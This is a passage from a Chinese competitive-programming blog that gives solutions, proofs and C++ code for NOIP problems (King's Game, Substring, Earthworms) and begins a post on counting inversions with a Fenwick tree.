<li>假设相邻的两个人i, i + 1。设A[i] * B[i] &lt;= A[i + 1] * B[i + 1]，i之前所有人的左手乘积为S。<br>则，ans1 = max{S / B[i], S * A[i] / B[i + 1]}<br>若交换<br>则，ans2 = max{S / B[i + 1], S * A[i + 1] / B[i]}<br>因为，A[i] * B[i] &lt;= A[i + 1] * B[i + 1]<br>所以，S * A[i] / B[i + 1] &lt;= S * A[i + 1] / B[i]<br>又因为，S / B[i + 1] &lt;= S * A[i] / B[i + 1]<br>所以，ans2 = S * A[i + 1] / B[i]<br>ans1 = max{S / B[i], S * A[i] / B[i + 1]}<br>所以，ans1 &lt;= ans2<br>证毕。</li>
</ol>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">man</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Left;</span><br><span class="line">    <span class="keyword">int</span> Right;</span><br><span class="line">    <span class="keyword">int</span> Mul;</span><br><span class="line">&#125;a[<span class="number">2000</span>],King;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Number</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Num[<span class="number">20000</span>];</span><br><span class="line">    <span class="keyword">int</span> Longth;</span><br><span class="line">    <span class="keyword">int</span> ans[<span class="number">20000</span>];</span><br><span class="line">&#125;b[<span class="number">3</span>],Full;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(man x,man y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> x.Mul&lt;y.Mul; &#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Chack</span><span class="params">(<span class="keyword">int</span> And)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=And;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b[<span class="number">2</span>].ans[i]&gt;Full.ans[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(b[<span class="number">2</span>].ans[i]&lt;Full.ans[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Switch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=b[<span class="number">2</span>].Longth;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[<span class="number">1</span>].Num[i]=b[<span class="number">2</span>].Num[i];</span><br><span class="line">        b[<span class="number">2</span>].Num[i]=<span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    b[<span class="number">1</span>].Longth=b[<span class="number">2</span>].Longth;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetMul</span><span class="params">(<span class="keyword">int</span> ID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Now=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Plus=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">while</span>(a[ID].Left)</span><br><span class="line">    &#123;</span><br><span class="line">        Plus++;</span><br><span class="line">        Now=a[ID].Left%<span class="number">10</span>;</span><br><span class="line">        a[ID].Left/=<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=b[<span class="number">1</span>].Longth;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            b[<span class="number">2</span>].Num[i+Plus]+=(b[<span class="number">1</span>].Num[i]*Now)/<span class="number">10</span>;</span><br><span class="line">            b[<span class="number">2</span>].Num[i+Plus<span class="number">-1</span>]+=(b[<span class="number">1</span>].Num[i]*Now)%<span class="number">10</span>;</span><br><span class="line">            b[<span class="number">2</span>].Num[i+Plus]+=b[<span class="number">2</span>].Num[i+Plus<span class="number">-1</span>]/<span class="number">10</span>;</span><br><span class="line">            b[<span class="number">2</span>].Num[i+Plus<span class="number">-1</span>]=b[<span class="number">2</span>].Num[i+Plus<span class="number">-1</span>]%<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!b[<span class="number">2</span>].Num[b[<span class="number">1</span>].Longth+Plus+<span class="number">1</span>]) Plus--;</span><br><span class="line">    b[<span class="number">2</span>].Longth=b[<span class="number">1</span>].Longth+Plus+<span class="number">1</span>;</span><br><span class="line">    Switch();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Change</span><span class="params">(<span class="keyword">int</span> Last)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Last;i++)</span><br><span class="line">    Full.ans[i]=b[<span class="number">2</span>].ans[i];</span><br><span class="line">    Full.Longth=Last;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Div</span><span class="params">(<span class="keyword">int</span> ID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> Flag=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Now=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Plus=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> Last=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=b[<span class="number">1</span>].Longth;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        Now*=<span class="number">10</span>;</span><br><span class="line">        Now+=b[<span class="number">1</span>].Num[i];</span><br><span class="line">        b[<span class="number">2</span>].ans[i]=Now/a[ID].Right;</span><br><span class="line">        Now%=a[ID].Right;</span><br><span class="line">        <span class="keyword">if</span>(b[<span class="number">2</span>].ans[i]&amp;&amp;!Flag)</span><br><span class="line">        &#123; Last=i; Flag=<span class="literal">true</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Chack(Last)) Change(Last);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read();</span><br><span class="line">    King.Left=Read();</span><br><span class="line">    King.Right=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i].Left=Read();</span><br><span class="line">        a[i].Right=Read();</span><br><span class="line">        a[i].Mul=a[i].Left*a[i].Right;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>,mycmp);</span><br><span class="line">    <span class="keyword">while</span>(King.Left)</span><br><span class="line">    &#123;</span><br><span class="line">        b[<span class="number">1</span>].Longth++;</span><br><span class="line">        b[<span class="number">1</span>].Num[b[<span class="number">1</span>].Longth]=King.Left%<span class="number">10</span>;</span><br><span class="line">        King.Left/=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Div(i);</span><br><span class="line">        GetMul(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=Full.Longth;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Full.ans[i];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="NOIP2015子串"><a href="#NOIP2015子串" class="headerlink" title="NOIP2015子串"></a>NOIP2015子串</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>有两个仅包含小写英文字母的字符串 A和B。现在要从字符串 A中取出 k个互不重叠的非空子串，然后把这k个子串按照其在字符串A中出现的顺序依次连接起来得到一个新的字符串，请问有多少种方案可以使得这个新串与字符串 B相等？注意：子串取出的位置不同也认为是不同的方案。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><ol>
<li>第一行是三个正整数n，m，k，分别表示字符串A的长度，字符串 B的长度，以及问题描述中所提到的k，每两个整数之间用一个空格隔开。</li>
<li>第二行包含一个长度为n的字符串，表示字符串A。</li>
<li>第三行包含一个长度为m的字符串，表示字符串B。</li>
</ol>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出共一行，包含一个整数，表示所求方案数。由于答案可能很大，所以这里要求输出答案对1,000,000,007取模的结果。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>这道题其实是很难想到的，尤其是状态设置和增加一个记录的DP式子来帮助转移主要的DP式子，我感觉到了考场上面根本不会写QAQ。</li>
<li>首先我们设状态F[i][j][k]，来表示对于A串的前i个分成k个子串来构成B串的前j个的方案数。那么F[i][j][k]其实就是分为是否选择i作为B串的组成的两个方案，第一个是选择A串的第i个来组成B串和不选择A串的第i个来组成B串。我们分开来讨论，对于选择i来说，我们设置一个状态S[i][j][k]来表示对于A串的前i个在一定选择i的情况下分成k个子串来构成B串的前j个的方案数。如果A[i]!=B[j]的话，毫无疑问，这个式子的值为零。如果A[i]==B[j]的时候，一定选择i且有k个子串有两种方式，一种是i作为独立的一个子串的方案数：F[i-1][j-1][k-1]，另外一种是i和前面的融合成一个的方案数：S[i-1][j-1][k]。两个加起来就是S[i][j][k]了。</li>
<li>上面的一定选择i的方案已经得出了方案数，然后就是不选择i的方案数，这个比较好求，就是F[i-1][j][k]，也就是同样是k个子串来组成j之前的B串，但是不包括i。这样我们把选择和不选择两种方案数加起来就是F[i][j][k]的值了。</li>
<li>还有比较重要的是初始化，F[i][0][0]的值都是1，用前i个A串不构成B串的方案永远是1。</li>
</ul>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Mod 1000000007</span></span><br><span class="line"><span class="keyword">int</span> n,m,k,S[<span class="number">3</span>][<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">int</span> F[<span class="number">3</span>][<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">char</span> A[<span class="number">2000</span>],B[<span class="number">400</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m=Read(); k=Read();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;A);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;B);</span><br><span class="line">    F[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--) A[i]=A[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=m;i&gt;=<span class="number">1</span>;i--) B[i]=B[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        F[i&amp;<span class="number">1</span>][<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> l=<span class="number">1</span>;l&lt;=k;l++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i]==B[j]) S[i&amp;<span class="number">1</span>][j][l]=(F[(i<span class="number">-1</span>)&amp;<span class="number">1</span>][j<span class="number">-1</span>][l<span class="number">-1</span>]+S[(i<span class="number">-1</span>)&amp;<span class="number">1</span>][j<span class="number">-1</span>][l])%Mod;</span><br><span class="line">            <span class="keyword">else</span> S[i&amp;<span class="number">1</span>][j][l]=<span class="literal">false</span>;</span><br><span class="line">            F[i&amp;<span class="number">1</span>][j][l]=(S[i&amp;<span class="number">1</span>][j][l]+F[(i<span class="number">-1</span>)&amp;<span class="number">1</span>][j][l])%Mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;F[n&amp;<span class="number">1</span>][m][k]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="NOIP2016-蚯蚓"><a href="#NOIP2016-蚯蚓" class="headerlink" title="NOIP2016 蚯蚓"></a>NOIP2016 蚯蚓</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>本题中，我们将用符号[c]表示对c向下取整，例如：[3.0」= [3.1」=[3.9」=3。</p>
</blockquote>
<ul>
<li><p>蛐蛐国最近蚯蚓成灾了！隔壁跳蚤国的跳蚤也拿蚯蚓们没办法，蛐蛐国王只好去请神刀手来帮他们消灭蚯蚓。蛐蛐国里现在共有n只蚯蚓（n为正整数)。每只蚯蚓拥有长度，我们设第i只蚯蚓的长度为a_i(i=1,2,…,n)，并保证所有的长度都是非负整数（即:可能存在长度为0的蚯蚓）。</p>
</li>
<li><p>每一秒，神刀手会在所有的蚯蚓中，准确地找到最长的那一只（如有多个则任选一个）将其切成两半。神刀手切开蚯蚓的位置由常数p(是满足0&lt;p&lt;1的有理数)决定，设这只蚯蚓长度为x，神刀手会将其切成两只长度分别为[px]和x-[px]的蚯蚓。特殊地，如果这两个数的其中一个等于0，则这个长度为0的蚯蚓也会被保留。此外，除了刚刚产生的两只新蚯蚓，其余蚯蚓的长度都会增加q(是一个非负整常数)。</p>
</li>
<li><p>蛐蛐国王知道这样不是长久之计，因为蚯蚓不仅会越来越多，还会越来越长。蛐蛐国王决定求助于一位有着洪荒之力的神秘人物，但是救兵还需要m秒才能到来……(m为非负整数）</p>
</li>
</ul>
<p>蛐蛐国王希望知道这m秒内的战况。具体来说，他希望知道：</p>
<ol>
<li>m秒内，每一秒被切断的蚯蚓被切断前的长度（有m个数）</li>
<li>m秒后，所有蚯蚓的长度（有n+m个数)。</li>
</ol>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><p>第一行包含六个整数n,m,q,u,v,t (你需要自己计算p = u/v)<br>第二行包含n个非负整数，为al,a2,…,an，即初始时n只蚯蚓的长度。</p>
<blockquote>
<p> 保证1&lt;n&lt;10^5 , 0&lt;m&lt;7*10^6，0&lt;u&lt;v&lt; 10^9 , 0&lt;q&lt;200，1&lt;t&lt;71，0&lt;a_i&lt;10^8</p>
</blockquote>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><ol>
<li>第一行输出[m/t]个整数，按时间顺序，依次输出第t秒，第2t秒，第3t秒……被切断蚯蚓（在被切断前）的长度。</li>
<li>第二行输出[(n+m)/t]个整数，输出m秒后蚯蚓的长度；需要按从大到小的顺序，依次输出排名第t，第2t，第3t……的长度。</li>
</ol>
<blockquote>
<p>同一行中相邻的两个数之间，恰好用一个空格隔开。即使某一行没有任何数需要 输出，你也应输出一个空行。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>emmmm，想当年，我在第一次参加NOIP的时候，不知道去用sort写QAQ，真的是垃圾啊，当时听说用堆可以水70分，sort强行50分。如果写了的话恐怕就不会太惨了吧。当年我还是太年轻，什么都不懂，太垃圾了。</li>
<li>去年NOIP的事情就不说了QAQ，说了就伤心。说说这道题吧，最开始接触是觉得比较难的，就尝试用堆写了写，果然70分，然后想不出来正解，就看了题解，发现其实代码实现是比较简单的，仅仅只是维护三个单调队列就可以了，好难受。</li>
<li>其实解决这道题的核心就是如何在O(1)的情况下确定哪一只蚯蚓要被割掉，如果用堆来维护的话，复杂度是O(logN)的，肯定要GG。所以说我们就可以试一试单调队列，我们通过建立三个单调队列，分别为主队列，大队列和小队列。主队列就是在读入数据的时候，排个序，然后从大到小进入队列，这个时候主队列一定是单调的队列，队头一定是最长的。但是每次把最长的蚯蚓切成两段的时候，就会多出来两条蚯蚓，那么如果进入主队列一定会破坏单调性的，所以我们可以让长的进入大队列里面，短的进入小队列里面。如何确保大队列和小队列一定是单调的呢？</li>
<li>其实这个问题是比较简单的，因为每次切得蚯蚓的长度一定小于上一个被切的蚯蚓加上每秒增长的长度，并且每只蚯蚓切出来的比例都是一样的，所以后面切的蚯蚓所出来的一长一短小蚯蚓长度一定小于前面切的蚯蚓所形成的一长一短的两个小蚯蚓，那么直接添加到大队列和小队列的队尾就行了，可以保证队列的单调性的。</li>
<li>对于所有蚯蚓每秒增长的长度，我们先不计，到最后被切的时候一次性加上去。加的就是已经过去的时间*每秒增加的长度。有些蚯蚓是后面形成的，在形成之前是没有增加长度的，我们就要在诞生的时候减去前面没有增加的长度，最后加长度的时候可以抵消，代码如下：</li>
</ul>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,q,u,v,t;</span><br><span class="line"><span class="keyword">int</span> Now,A,B,all;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">100001</span>];</span><br><span class="line"><span class="keyword">int</span> q1[<span class="number">16000000</span>];</span><br><span class="line"><span class="keyword">int</span> q2[<span class="number">16000000</span>];</span><br><span class="line"><span class="keyword">int</span> q3[<span class="number">16000000</span>];</span><br><span class="line"><span class="keyword">int</span> head1=<span class="literal">true</span>,tail1=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> head2=<span class="literal">true</span>,tail2=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">int</span> head3=<span class="literal">true</span>,tail3=<span class="literal">false</span>;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">int</span> This=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=getchar();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch))</span><br><span class="line">    &#123;</span><br><span class="line">        This=(This&lt;&lt;<span class="number">1</span>)+(This&lt;&lt;<span class="number">3</span>)+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> This*F;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetMax</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Maxx=<span class="number">-2123456789</span>,ID=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(q1[head1]&gt;Maxx&amp;&amp;head1&lt;=tail1)</span><br><span class="line">    &#123;</span><br><span class="line">        Maxx=q1[head1];</span><br><span class="line">        ID=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q2[head2]&gt;Maxx&amp;&amp;head2&lt;=tail2)</span><br><span class="line">    &#123;</span><br><span class="line">        Maxx=q2[head2];</span><br><span class="line">        ID=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q3[head3]&gt;Maxx&amp;&amp;head3&lt;=tail3)</span><br><span class="line">    &#123;</span><br><span class="line">        Maxx=q3[head3];</span><br><span class="line">        ID=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ID==<span class="number">1</span>) head1++;</span><br><span class="line">    <span class="keyword">if</span>(ID==<span class="number">2</span>) head2++;</span><br><span class="line">    <span class="keyword">if</span>(ID==<span class="number">3</span>) head3++;</span><br><span class="line">    <span class="keyword">return</span> Maxx;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n=Read(); m=Read(); q=Read();</span><br><span class="line">    u=Read(); v=Read(); t=Read();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) a[i]=Read();</span><br><span class="line">    sort(a+<span class="number">1</span>,a+n+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    q1[++tail1]=a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Now=GetMax()+all;</span><br><span class="line">        <span class="keyword">if</span>(i%t==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,Now);</span><br><span class="line">        A=<span class="number">1LL</span>*Now*u/v-all-q;</span><br><span class="line">        B=Now<span class="number">-1LL</span>*Now*u/v-all-q;</span><br><span class="line">        q2[++tail2]=max(A,B);</span><br><span class="line">        q3[++tail3]=min(A,B);</span><br><span class="line">        all+=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n+m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Now=GetMax();</span><br><span class="line">        <span class="keyword">if</span>(i%t==<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,Now+all);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>NOIP</tag>
      </tags>
  </entry>
  <entry>
    <title>树状数组求逆序对</title>
    <url>/2017/10/25/894c4557e61e/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>我原本只知道求逆序对可以用归并排序，但是现在在做一道DP的题目的时候，需要通过求逆序对来优化，然后就意外的知道了树状数组求逆序对的方法……</p>
</blockquote>
<p>其实，其实这篇博客本来应该合并在最开始写的树状数组里面的，但是懒得找了，直接开一篇新的吧，这样比较方便。</p>
<p>其实逆序对是可以用归并排序来写的，复杂度和树状数组是一样的都是O(NlogN),但是树状数组要好写一些，常数也比较的小……</p>
<p>然后就是这几天一直在刷NOIP的题目，超级爽……</p>
<h1 id="树状数组求逆序对"><a href="#树状数组求逆序对" class="headerlink" title="树状数组求逆序对"></a>树状数组求逆序对</h1><h2 id="树状数组："><a href="#树状数组：" class="headerlink" title="树状数组："></a>树状数组：</h2><p>首先我要重复一些树状数组的思路，因为我在写树状数组求逆序对的时候，一直想不通为什么，emmmmm其实是忘掉了树状数组是单点修改，区间查询的条件，以为是区间修改，区间查询。然后就死活都理解不了为什么这样可以求出来逆序对。</p>
<blockquote>
<p>树状数组的本质上是单点修改，区间查询。一定要记得这一点。然后树状数组的c[i]保存的是它所属的下属元素的累加和,每次查询区间的时候都是从1到x这个区间里面的所有元素的和。每次在更新的时候也是不断的将控制它的c[i]也更新一下。emmmmm仔细想想其实是很简单的。</p>
</blockquote>
<h2 id="策略："><a href="#策略：" class="headerlink" title="策略："></a>策略：</h2><ul>
<li>其实策略是比较简单的，我们遍历这个数组，将a[i]这个点修改到树状数组里面+1，然后查询a[i]+1到n的和，ans加上这个和即可。最后这个ans就是逆序对的个数。</li>
<li>其实这个就是通过树状数组把原本O(n)的查询时间改成了O(logn)，所以和归并排序是一样的。</li>
</ul>
<h1 id="线段树需要注意的地方"><a href="#线段树需要注意的地方" class="headerlink" title="线段树需要注意的地方"></a>线段树需要注意的地方</h1><ul>
<li>这个说一下线段树，线段树每次开始的Left,Right,Root的值是固定的，都是1,Maxx,1。控制查询和修改的范围是通过修改全局变量x和y来实现的。</li>
</ul>
